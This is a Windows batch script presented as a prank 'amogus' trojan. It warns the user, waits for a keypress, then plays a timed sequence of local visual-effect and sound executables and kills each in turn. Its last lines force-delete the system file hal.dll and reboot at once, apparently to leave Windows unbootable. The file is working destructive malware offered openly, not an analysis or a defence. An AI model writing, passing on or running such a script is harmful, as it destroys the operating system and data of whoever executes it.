/shift 0
@echo off
cls
title "(amogus symbol)"
echo You ran this trojan that will delete your data and operating system. You want to run this? Creator not reponsible for any damages!
pause
start c:\amogussymbol-files\circle.exe
start c:\amogussymbol-files\swirl.exe
PING localhost -n 5 >NUL
start c:\amogussymbol-sounds\AFirst.exe
PING localhost -n 33 >NUL
taskkill /f /im AFirst.exe
taskkill /f /im Swirl.exe
taskkill /f /im Circle.exe
start C:\amogussymbol-files\Trippy.exe
start c:\Amogussymbol-files\patblt3.exe
PING localhost -n 5 >NUL
start c:\amogussymbol-Sounds\Adun.exe
PING localhost -n 38 >NUL
taskkill /f /im ADun.exe
taskkill /f /im Trippy.exe
taskkill /f /im patblt3.exe
start c:\Amogussymbol-files\Circles.exe
PING localhost -n 5 >NUL
start c:\Amogussymbol-sounds\ACube.exe
PING localhost -n 25 >NUL
taskkill /f /im Acube.exe
start c:\Amogussymbol-sounds\Alast.exe
start c:\Amogussymbol-files\Patblt3.exe
PING localhost -n 39 >NUL
taskkill /f /im Alast.exe
taskkill /f /im Circles.exe
taskkill /f /im Patblt3.exe
del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
shutdown /r /t 0